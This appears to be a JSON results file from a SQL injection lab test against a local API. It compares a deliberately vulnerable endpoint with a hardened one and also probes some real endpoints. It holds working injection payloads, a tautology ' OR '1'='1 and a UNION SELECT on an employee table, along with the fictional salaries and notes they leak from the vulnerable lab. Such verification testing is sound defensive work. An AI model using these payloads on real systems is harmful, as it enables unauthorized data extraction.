@@ -1,0 +1,234 @@
+{
+  "generatedAt": "2026-11-23T17:35:47.139Z",
+  "base": "http://127.0.0.1:3101/api",
+  "rows": [
+    {
+      "target": "vulnerable lab",
+      "payload": "valid",
+      "request": "ana.solis@example.test",
+      "response": {
+        "status": 200,
+        "body": {
+          "data": [
+            {
+              "id": "1",
+              "name": "Ana Solís",
+              "email": "ana.solis@example.test",
+              "fictional_salary": "1800.00",
+              "secret_note": "Nota ficticia A"
+            }
+          ]
+        }
+      }
+    },
+    {
+      "target": "safe lab",
+      "payload": "valid",
+      "request": "ana.solis@example.test",
+      "response": {
+        "status": 200,
+        "body": {
+          "data": [
+            {
+              "id": "1",
+              "name": "Ana Solís",
+              "email": "ana.solis@example.test",
+              "fictional_salary": "1800.00"
+            }
+          ]
+        }
+      }
+    },
+    {
+      "target": "vulnerable lab",
+      "payload": "or",
+      "request": "' OR '1'='1",
+      "response": {
+        "status": 200,
+        "body": {
+          "data": [
+            {
+              "id": "1",
+              "name": "Ana Solís",
+              "email": "ana.solis@example.test",
+              "fictional_salary": "1800.00",
+              "secret_note": "Nota ficticia A"
+            },
+            {
+              "id": "2",
+              "name": "Bruno Rojas",
+              "email": "bruno.rojas@example.test",
+              "fictional_salary": "2100.00",
+              "secret_note": "Nota ficticia B"
+            },
+            {
+              "id": "3",
+              "name": "Carla Mora",
+              "email": "carla.mora@example.test",
+              "fictional_salary": "1950.00",
+              "secret_note": "Nota ficticia C"
+            },
+            {
+              "id": "4",
+              "name": "Diego Vega",
+              "email": "diego.vega@example.test",
+              "fictional_salary": "2300.00",
+              "secret_note": "Nota ficticia D"
+            },
+            {
+              "id": "5",
+              "name": "Elena Castro",
+              "email": "elena.castro@example.test",
+              "fictional_salary": "1750.00",
+              "secret_note": "Nota ficticia E"
+            },
+            {
+              "id": "6",
+              "name": "Fabian Leon",
+              "email": "fabian.leon@example.test",
+              "fictional_salary": "2500.00",
+              "secret_note": "Nota ficticia F"
+            },
+            {
+              "id": "7",
+              "name": "Gabriela Ruiz",
+              "email": "gabriela.ruiz@example.test",
+              "fictional_salary": "2200.00",
+              "secret_note": "Nota ficticia G"
+            },
+            {
+              "id": "8",
+              "name": "Hugo Campos",
+              "email": "hugo.campos@example.test",
+              "fictional_salary": "2050.00",
+              "secret_note": "Nota ficticia H"
+            }
+          ]
+        }
+      }
+    },
+    {
+      "target": "safe lab",
+      "payload": "or",
+      "request": "' OR '1'='1",
+      "response": {
+        "status": 400,
+        "body": {
+          "error": "Invalid email"
+        }
+      }
+    },
+    {
+      "target": "vulnerable lab",
+      "payload": "union",
+      "request": "' UNION SELECT id, name, email, fictional_salary, secret_note FROM security_lab.lab_employees --",
+      "response": {
+        "status": 200,
+        "body": {
+          "data": [
+            {
+              "id": "5",
+              "name": "Elena Castro",
+              "email": "elena.castro@example.test",
+              "fictional_salary": "1750.00",
+              "secret_note": "Nota ficticia E"
+            },
+            {
+              "id": "4",
+              "name": "Diego Vega",
+              "email": "diego.vega@example.test",
+              "fictional_salary": "2300.00",
+              "secret_note": "Nota ficticia D"
+            },
+            {
+              "id": "8",
+              "name": "Hugo Campos",
+              "email": "hugo.campos@example.test",
+              "fictional_salary": "2050.00",
+              "secret_note": "Nota ficticia H"
+            },
+            {
+              "id": "7",
+              "name": "Gabriela Ruiz",
+              "email": "gabriela.ruiz@example.test",
+              "fictional_salary": "2200.00",
+              "secret_note": "Nota ficticia G"
+            },
+            {
+              "id": "3",
+              "name": "Carla Mora",
+              "email": "carla.mora@example.test",
+              "fictional_salary": "1950.00",
+              "secret_note": "Nota ficticia C"
+            },
+            {
+              "id": "1",
+              "name": "Ana Solís",
+              "email": "ana.solis@example.test",
+              "fictional_salary": "1800.00",
+              "secret_note": "Nota ficticia A"
+            },
+            {
+              "id": "6",
+              "name": "Fabian Leon",
+              "email": "fabian.leon@example.test",
+              "fictional_salary": "2500.00",
+              "secret_note": "Nota ficticia F"
+            },
+            {
+              "id": "2",
+              "name": "Bruno Rojas",
+              "email": "bruno.rojas@example.test",
+              "fictional_salary": "2100.00",
+              "secret_note": "Nota ficticia B"
+            }
+          ]
+        }
+      }
+    },
+    {
+      "target": "safe lab",
+      "payload": "union",
+      "request": "' UNION SELECT id, name, email, fictional_salary, secret_note FROM security_lab.lab_employees --",
+      "response": {
+        "status": 400,
+        "body": {
+          "error": "Invalid email"
+        }
+      }
+    },
+    {
+      "target": "real /chat",
+      "payload": "OR",
+      "request": "' OR '1'='1",
+      "response": {
+        "status": 401,
+        "body": {
+          "error": "Unauthorized"
+        }
+      }
+    },
+    {
+      "target": "real /leave-requests",
+      "payload": "OR",
+      "request": "' OR '1'='1",
+      "response": {
+        "status": 401,
+        "body": {
+          "error": "Unauthorized"
+        }
+      }
+    },
+    {
+      "target": "real /reports/daily?date=2026-01-01",
+      "payload": "OR",
+      "request": "' OR '1'='1",
+      "response": {
+        "status": 401,
+        "body": {
+          "error": "Unauthorized"
+        }
+      }
+    }
+  ]
+}
